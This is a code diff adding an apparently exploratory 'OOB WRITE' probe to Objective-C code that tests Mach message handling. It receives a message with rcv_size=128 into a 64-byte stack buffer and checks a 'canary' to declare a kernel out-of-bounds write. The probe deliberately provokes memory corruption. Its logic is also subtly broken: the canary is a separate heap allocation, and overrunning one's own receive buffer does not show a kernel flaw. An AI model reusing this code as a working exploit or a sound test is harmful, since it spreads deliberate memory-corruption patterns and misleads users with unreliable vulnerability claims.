@@ -1488,7 +1488,73 @@ cleanup:
                                 }
                                 mach_port_destroy(mach_task_self(), recvPort);
                             }
-                        }
+
+                            // ---- OOB WRITE: receive with oversized rcv_size ----
+                            // Send a message with known data, then receive with rcv_size
+                            // LARGER than our buffer. Kernel writes past buffer → OOB write.
+                            scopeNote(r, @"  --- OOB WRITE: receive with oversized rcv_size ---");
+                            {
+                                mach_port_t wrxPort = MACH_PORT_NULL;
+                                kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wrxPort);
+                                if (kr == KERN_SUCCESS) {
+                                    mach_port_insert_right(mach_task_self(), wrxPort, wrxPort, MACH_MSG_TYPE_MAKE_SEND);
+
+                                    // Send a message with 128 bytes of data
+                                    uint8_t sendBuf[256];
+                                    memset(sendBuf, 0x44, sizeof(sendBuf));  // 'D' fill
+                                    mach_msg_header_t *shdr = (mach_msg_header_t *)sendBuf;
+                                    shdr->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+                                    shdr->msgh_size = 128;
+                                    shdr->msgh_remote_port = wrxPort;
+                                    shdr->msgh_local_port = MACH_PORT_NULL;
+                                    shdr->msgh_id = 0x2337;
+                                    // Fill data area with recognizable pattern
+                                    for (int j = 24; j < 128; j += 8)
+                                        *(uint64_t *)(sendBuf + j) = 0xAAAA000000000000ULL + j;
+
+                                    kr = mach_msg(shdr, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                                        128, 0, MACH_PORT_NULL, 100, MACH_PORT_NULL);
+                                    scopeNote(r, [NSString stringWithFormat:
+                                        @"  OOB-WRITE send ret=%d", (int)kr]);
+
+                                    if (kr == MACH_MSG_SUCCESS) {
+                                        // Receive with SMALL buffer but LARGE rcv_size
+                                        uint8_t smallBuf[64];  // actual buffer = 64
+                                        memset(smallBuf, 0x55, sizeof(smallBuf));  // 'U' fill (unique)
+                                        // Place canary after smallBuf
+                                        uint8_t *canary = malloc(64);
+                                        memset(canary, 0x66, 64);  // 'F' fill
+                                        *(uint64_t *)canary = 0xCAFEBABEDEADBEEFULL;
+
+                                        // Tell kernel rcv_size=128 but buffer is only 64!
+                                        mach_msg_header_t *rhdr = (mach_msg_header_t *)smallBuf;
+                                        kr = mach_msg(rhdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                                            0, 128,  // rcv_size = 128 > 64 = OOB write
+                                            wrxPort, 100, MACH_PORT_NULL);
+                                        scopeNote(r, [NSString stringWithFormat:
+                                            @"  OOB-WRITE recv ret=%d  rcv_size=128  buf=64", (int)kr]);
+
+                                        if (kr == MACH_MSG_SUCCESS) {
+                                            // Check if canary was overwritten
+                                            uint64_t canaryVal = *(uint64_t *)canary;
+                                            scopeNote(r, [NSString stringWithFormat:
+                                                @"  canary: 0x%016llx (was 0xCAFEBABEDEADBEEF)", (unsigned long long)canaryVal]);
+                                            if (canaryVal != 0xCAFEBABEDEADBEEFULL) {
+                                                scopeNote(r, @"  >>> OOB WRITE CONFIRMED — canary overwritten by kernel!");
+                                            } else {
+                                                scopeNote(r, @"  canary intact — kernel limited copy to buffer size");
+                                            }
+                                            // Also check smallBuf content
+                                            NSMutableString *hex = [NSMutableString string];
+                                            for (int j = 0; j < 48; j++)
+                                                [hex appendFormat:@"%02x ", smallBuf[j]];
+                                            scopeNote(r, [NSString stringWithFormat:@"  smallBuf: %@", hex]);
+                                        }
+                                        free(canary);
+                                    }
+                                    mach_port_destroy(mach_task_self(), wrxPort);
+                                }
+                            }
                     }
                 }
                 if (len > 0xFFFF) {
